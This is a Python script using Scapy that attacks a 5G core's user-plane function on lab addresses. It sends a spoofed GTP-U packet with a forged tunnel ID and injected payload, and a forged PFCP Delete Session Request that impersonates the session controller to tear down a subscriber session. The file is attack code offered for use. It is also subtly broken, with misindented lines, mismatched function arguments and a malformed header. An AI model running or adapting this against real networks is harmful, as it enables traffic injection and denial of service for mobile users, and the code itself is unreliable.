from scapy.all import *
import struct
import random


GTP_PORT = 2152  
PFCP_PORT = 8805  
PFCP_VERSION = 1  
PFCP_DELETE_SESSION_REQUEST = 0x41  

def create_malicious_gtp_u_packet(ue_ip, upf_ip, spoofed_teid):
 

    gtp_header = IP(src=ue_ip, dst=upf_ip) / UDP(sport=GTP_PORT, dport=GTP_PORT) / \
                 Raw(load=struct.pack("!B3xI", 0x36, spoofed_teid))  


    gtp_payload = Raw(load="MALICIOUS DATA INJECTED INTO THE GTP-U TUNNEL")

  
    malicious_packet = gtp_header / gtp_payload
    return malicious_packet


def send_malicious_gtp_u_packet(ue_ip, upf_ip, spoofed_teid):
   
    malicious_packet = create_malicious_gtp_u_packet(ue_ip, upf_ip, spoofed_teid)
    print(f"Injecting malicious GTP-U packet with TEID: {spoofed_teid} from {ue_ip} to UPF: {upf_ip}")
    send(malicious_packet, verbose=True)


def create_pfcp_delete_session_request(seid, smf_ip, upf_ip):
    
    pfcp_header = struct.pack("!BBH", (PFCP_VERSION << 5), PFCP_DELETE_SESSION_REQUEST, 0)

     pfcp_seid = struct.pack("!Q", seid)  
      pfcp_payload = b""
    pfcp_msg = IP(src=smf_ip, dst=upf_ip) / UDP(sport=PFCP_PORT, dport=PFCP_PORT) / \
               Raw(load=pfcp_header + pfcp_seid + pfcp_payload)
    
    return pfcp_msg

def send_malicious_pfcp_delete_request(seid, upf_ip):
   
    pfcp_msg = create_pfcp_delete_session_request(seid,  upf_ip)
    print(f"Sending PFCP Delete Session Request with SEID: {seid} to UPF: {upf_ip}")
    send(pfcp_msg, verbose=True)



if __name__ == "__main__":
   
    ue_ip = "192.168.56.106"  
    upf_ip = "192.168.56.112" 
    
    
    spoofed_teid = 0x00000002  

    seid = 0x91a  
    
  
    send_malicious_gtp_u_packet(ue_ip, upf_ip, spoofed_teid)

    send_malicious_pfcp_delete_request(seid, ue_ip, upf_ip)


